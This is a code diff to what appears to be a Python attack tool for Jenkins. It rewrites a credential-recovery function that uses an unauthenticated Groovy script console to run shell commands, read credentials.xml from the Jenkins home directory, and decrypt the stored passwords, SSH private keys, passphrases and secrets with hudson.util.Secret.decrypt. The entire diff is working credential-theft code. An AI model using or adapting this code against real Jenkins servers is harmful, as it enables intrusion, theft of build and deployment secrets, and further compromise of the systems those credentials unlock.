@@ -3,8 +3,12 @@
 import requests
 import jenkins
 import urllib3
-from bs4 import BeautifulSoup
 import re
+import base64
+from hashlib import sha256
+from binascii import hexlify, unhexlify
+from Crypto.Cipher import AES
+from bs4 import BeautifulSoup
 
 DEFAULT_PORTS = [80, 8080, 443, 8000, 8081]
 DEFAULT_PATHS = ['/', '/jenkins']
@@ -73,72 +77,71 @@ def script_interface(url, script):
 
         res = s.post(url + 'script', headers=headers, data=data)
         soup = BeautifulSoup(res.text, 'html.parser')
-        return soup.body.findAll('pre')[1].text.replace('Result: ', '')
+        return soup.body.find_all('pre')[1].text.replace('Result: ', '')
+
+def decrypt_secret(url, secret):
+    return script_interface(url, 'hudson.util.Secret.decrypt \'%s\'' % secret)
 
 def credential_recovery(target):
+    # Still need to enumerate config.xml of each job for creds
     creds = {}
+    if target['url'].endswith('/'):
+        url = target['url']
+    else:
+        url = target['url'] + '/'
     if 'script_console' in target['vulns'] and target['vulns']['script_console']:
-        if target['url'].endswith('/'):
-            url = target['url']
+        env = script_interface(url, 'println "env".execute().text')
+        match = re.search(r'^JENKINS_HOME=(.+)$', env, re.M)
+        if match:
+            path = match.group(1)
         else:
-            url = target['url'] + '/'
-        cred_store_url = ''
-        cred_store_urls = [
-            'credential-store/domain/_/',
-            'credentials/store/system/domain/_/'
-        ]
-        for u in cred_store_urls:
-            res = requests.get(url + u)
-            if res.status_code == 200:
-                cred_store_url = u
-                break
-        if not cred_store_url:
-            print 'Could not locate credential store URL'
-            return creds
+            path = '/var/lib/jenkins'
 
-        soup = BeautifulSoup(res.text, 'html.parser')
-
-        credentials = []
-        for link in soup.body.findAll('a', href=True):
-            if link['href'].startswith('credential/'):
-                credential = link['href'].split('/')[1]
-                if credential not in credentials:
-                    credentials.append(credential)
-
-        for credential in credentials:
-            print 'Extracting credential: ' + credential
-            res = requests.get(url + cred_store_url + 'credential/' + credential + '/update')
-            if res.status_code != 200:
-                continue
-            soup = BeautifulSoup(res.text, 'html.parser')
-
-            if re.search(r'_\.username', res.text) and re.search(r'_\.password', res.text):
-                username = soup.body.findAll(attrs={'name': '_.username'})[0]['value']
-                e_pass = soup.body.findAll(attrs={'name': '_.password'})[0]['value']
-                
-                script = 'hudson.util.Secret.decrypt \'%s\'' % e_pass
-                password = script_interface(url, script).strip()
-
-                creds.update({credential: {'type': 'password', 'username': username, 'password': password}})
-
-            elif re.search(r'_\.passphrase', res.text) and re.search(r'_\.privateKey', res.text):
-                e_passphrase = soup.body.findAll(attrs={'name': '_.passphrase'})[0]['value'].strip()
-                key_field = soup.body.findAll(attrs={'name': '_.privateKey'})[0].contents
-                if key_field:
-                    private_key = key_field[0].strip()
-                else:
-                    private_key = 'Could not recover'
-                script = 'hudson.util.Secret.decrypt \'%s\'' % e_passphrase
-                passphrase = script_interface(url, script)
-
-                creds.update({credential: {'type': 'private_key', 'key': private_key, 'passphrase': passphrase}})
-
-            elif re.search(r'_\.secret', res.text):
-                e_secret = soup.body.findAll(attrs={'name': '_.secret'})[0]['value'].strip()
-                script = 'hudson.util.Secret.decrypt \'%s\'' % e_secret
-                secret = script_interface(url, script)
-
-                creds.update({credential: {'type': 'secret', 'secret': secret}})
+        credentials_xml = script_interface(url, 'println "cat ' + path + '/credentials.xml".execute().text')
+        soup = BeautifulSoup(credentials_xml, 'lxml')
+        for element in soup.find_all('id'):
+            uuid = element.get_text(strip=True)
+            parent = element.parent
+            description = 'None'
+            if parent.find('description'):
+                description = parent.find('description').get_text(strip=True)
+            if parent.find('privatekey'):
+                username = parent.find('username').get_text(strip=True)
+                enc_key = parent.find('privatekey').get_text(strip=True)
+                enc_passphrase = parent.find('passphrase').get_text(strip=True)
+                key = decrypt_secret(url, enc_key).strip()
+                passphrase = decrypt_secret(url, enc_passphrase).strip()
+                creds.update({
+                    uuid: {
+                        'type': 'key', 
+                        'description': description,
+                        'username': username,
+                        'passphrase': passphrase,
+                        'key': key
+                    }
+                })
+            elif parent.find('password'):
+                username = parent.find('username').get_text(strip=True)
+                enc_password = parent.find('password').get_text(strip=True)
+                password = decrypt_secret(url, enc_password).strip()
+                creds.update({
+                    uuid: {
+                        'type': 'password',
+                        'description': description,
+                        'username': username,
+                        'password': password
+                    }
+                })
+            elif parent.find('secret'):
+                enc_secret = parent.find('secret').get_text(strip=True)
+                secret = decrypt_secret(url, enc_secret).strip()
+                creds.update({
+                    uuid: {
+                        'type': 'secret',
+                        'description': description,
+                        'secret': secret
+                    }
+                })
 
     return creds
 
